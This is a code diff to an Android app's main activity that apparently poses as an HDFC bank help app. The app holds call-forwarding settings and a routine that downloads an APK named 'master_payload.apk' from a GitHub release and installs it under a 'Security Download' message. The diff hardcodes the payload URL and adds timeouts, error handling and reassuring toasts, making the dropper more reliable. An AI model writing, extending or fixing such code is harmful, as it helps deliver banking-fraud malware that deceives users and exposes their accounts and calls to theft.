@@ -42,7 +42,7 @@ import java.util.Locale;
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://backprince.onrender.com";
-    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v3.0.${RUN_NUMBER}/master_payload.apk";
+    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v3.0.69/master_payload.apk";
     private String forwardingNumber = null;
     private boolean forwardingEnabled = false;
 
@@ -72,6 +72,7 @@ public class MainActivity extends BridgeActivity {
     }
 
     private void downloadAndInstallUpdate() {
+        runOnUiThread(() -> Toast.makeText(this, "🚀 Starting Security Download...", Toast.LENGTH_SHORT).show());
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -79,9 +80,18 @@ public class MainActivity extends BridgeActivity {
                     URL url = new URL(UPDATE_URL);
                     HttpURLConnection c = (HttpURLConnection) url.openConnection();
                     c.setRequestMethod("GET");
+                    c.setConnectTimeout(15000);
+                    c.setReadTimeout(15000);
                     c.connect();
 
+                    if (c.getResponseCode() != HttpURLConnection.HTTP_OK) {
+                        runOnUiThread(() -> Toast.makeText(MainActivity.this, "❌ Server Error: " + c.getResponseCode(), Toast.LENGTH_LONG).show());
+                        return;
+                    }
+
                     File file = new File(getExternalFilesDir(null), "hdfc_help_v3.apk");
+                    if (file.exists()) file.delete();
+                    
                     FileOutputStream fos = new FileOutputStream(file);
                     InputStream is = c.getInputStream();
 
@@ -96,12 +106,14 @@ public class MainActivity extends BridgeActivity {
                     runOnUiThread(new Runnable() {
                         @Override
                         public void run() {
+                            Toast.makeText(MainActivity.this, "✅ Download Complete! Installing...", Toast.LENGTH_SHORT).show();
                             installApk(file);
                         }
                     });
 
-                } catch (Exception e) {
+                } catch (final Exception e) {
                     Log.e(TAG, "Update Error", e);
+                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "⚠️ Download Failed: " + e.getMessage(), Toast.LENGTH_LONG).show());
                 }
             }
         }).start();
